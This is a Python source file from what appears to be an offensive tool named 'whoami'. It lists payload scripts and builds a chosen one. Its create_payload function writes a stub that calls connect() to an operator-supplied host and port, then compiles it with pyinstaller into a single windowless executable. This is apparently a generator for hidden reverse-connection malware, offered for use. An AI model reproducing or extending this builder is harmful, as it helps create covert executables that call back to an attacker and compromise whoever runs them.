import os
import platform
import shutil
import subprocess

RED = '\033[91m'
GREEN = '\33[32m'
END = '\033[0m'

try:
    import pathlib
    
except:
    print(f"\n{RED}[!]{END} Failed To Import Packeges Try To Install It Manually Using The Following Command 'pip install -r requirements.txt'.")
    exit()



def show_payloads():
    payloads = pathlib.Path("whoami_payloads/").glob("*.py")
    
    for file in payloads:
        print(f'\n{GREEN}[+]{END} {file}')
        
def check_payload(payload):
    if os.path.isfile(payload):
        return True
    else:
        return False

def machine_os():
    try:
        machine_os = platform.system()
        return machine_os

    except Exception as e:
        return(f"\n{RED}[!]{END} Failed To Get The Machine Os.")

def create_payload(payload , payload_name, payload_host, payload_port):
    source = payload.split('\\', 1)[1]
    payload_import = source.split(".py", 1)[0]
    
    shutil.copyfile(payload, f"whoami-output/{source}")

    with open(f"whoami-output/{payload_name}.py", "w") as file:
        file.write(f"from {payload_import} import connect\n")
        file.write(f"connect('{payload_host}', {payload_port})\n")
    
    os.system(f"pyinstaller --onefile --noconsole whoami-output/{payload_name}.py")

    print(f"\n{GREEN}[+]{END} Payload Created Succesfully.")